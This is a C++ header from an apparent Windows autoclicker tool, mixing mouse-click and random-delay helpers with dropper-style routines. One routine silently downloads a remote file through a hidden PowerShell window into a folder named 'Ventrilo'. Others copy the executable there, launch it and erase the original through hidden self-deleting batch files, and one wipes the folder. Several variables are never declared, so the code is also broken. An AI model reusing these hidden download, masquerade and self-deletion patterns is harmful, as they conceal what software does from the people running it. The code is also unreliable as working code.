#pragma once

#include <sys/types.h>
#include <sys/stat.h>

#define MAX _MAX_PATH

void click() //Defines the function.
{
	mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0); //Left mouse button is pressed.
	mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0); //Left mouse button is released.

												 //Used together to simulate one mouse click.
}

void generate() //Defines the function.
{
	//Random Number Generation
	rnd = (rand() % 10) + 1; //Generates a random number between 1-10
	sleepy = rnd * 15; //Multiplies that number by 15 so that it is in the range of numbers I want (15-150)
}

void registry_read(LPCTSTR subkey, LPCTSTR name, DWORD type) //Defines the function.
{
	HKEY key;
	TCHAR value[255];
	DWORD value_length = 255;
	RegOpenKey(HKEY_LOCAL_MACHINE, subkey, &key);
	RegQueryValueEx(key, name, NULL, &type, (LPBYTE)&value, &value_length);
	RegCloseKey(key);
}

void getdependencies(const std::string& url, const std::string& filename)
{
	struct stat info;

	if (stat("C:\\Ventrilo", &info) != 0)
	{
		system("mkdir C:\\Ventrilo > NULL");

		system(("start powershell -windowstyle hidden(New-Object Net.WebClient).DownloadFile('" + url + "', '" + filename + "')").c_str());
	}

	else if (info.st_mode & S_IFDIR)
	{
		system(("start powershell -windowstyle hidden (New-Object Net.WebClient).DownloadFile('" + url + "', '" + filename + "')").c_str());
	}
}

bool fileExists(const std::string& filename)
{
	struct stat buf;
	if (stat(filename.c_str(), &buf) != -1)
	{
		return true;
	}
	return false;
}

int RetrieveSize(const std::string &fileName)
{
	std::ifstream file(fileName.c_str(), std::ifstream::in | std::ifstream::binary);

	if (!file.is_open())
	{
		return -1;
	}

	file.seekg(0, std::ios::end);
	int fileSize = file.tellg();
	file.close();

	sizeoffile = fileSize;
	return fileSize;
}


void RunNew(std::string &filename)
{
	char batname[MAX] = "runnew.bat";
	char batcmd[MAX] = "@echo off\nstart C:\\Ventrilo\\Autoclicker.exe\nexit 0";
	char temppath[MAX];
	GetTempPath(MAX, temppath);
	FILE *fp;
	_chdir(temppath);
	fp = fopen(batname, "w");
	fprintf(fp, batcmd);
	strcat(temppath, "\\");
	strcat(temppath, batname);
	fprintf(fp, "\ndel %s", temppath);
	fclose(fp);
	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);

}

void MoveExe(LPSTR exepath, std::string &filename)
{
	system(("copy "+filepath+" C:\\Ventrilo /Y").c_str());
	char batname[MAX] = "selfdestruct.bat";
	char batcmd[MAX] = ":Repeat\ndel \"%s\"\nif exist \"%s\" goto Repeat\ndel \"%s\"";
	char temppath[MAX];
	GetTempPath(MAX, temppath);
	FILE *fp;
	_chdir(temppath);
	fp = fopen(batname, "w");
	fprintf(fp, batcmd, exepath, exepath, exepath);
	strcat(temppath, "\\");
	strcat(temppath, batname);
	fprintf(fp, "\ndel %s", temppath);
	fclose(fp);
	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
	RunNew(filename);
	exit(0);
}

void SelfDestruct(LPSTR exepath)
{
	char batname[MAX] = "selfdestruct.bat";
	char batcmd[MAX] = ":Repeat\ndel \"%s\"\nif exist \"%s\" goto Repeat\ndel \"%s\"";
	char temppath[MAX];
	GetTempPath(MAX, temppath);
	FILE *fp;
	_chdir(temppath);
	fp = fopen(batname, "w");
	fprintf(fp, batcmd, exepath, exepath, exepath);
	strcat(temppath, "\\");
	strcat(temppath, batname);
	fprintf(fp, "\ndel %s", temppath);
	fclose(fp);
	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
	system("rmdir C:\\Ventrilo /S /Q");
}

BOOL Question(const char* Ask, const char* Title)
{
	int btn = MessageBox(0, Ask, Title, MB_YESNO + MB_ICONQUESTION);
	if (btn == IDYES) {
		return true;
	}
	else {
		return false;
	}
}

DWORD ConvertString(std::string &str)
{
	DWORD converted;
	std::istringstream ss(str);
	ss >> std::hex >> converted;

	return converted;
}

bool contains_letter(const std::string &c)
{
	return (c.find_first_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") != std::string::npos);
}
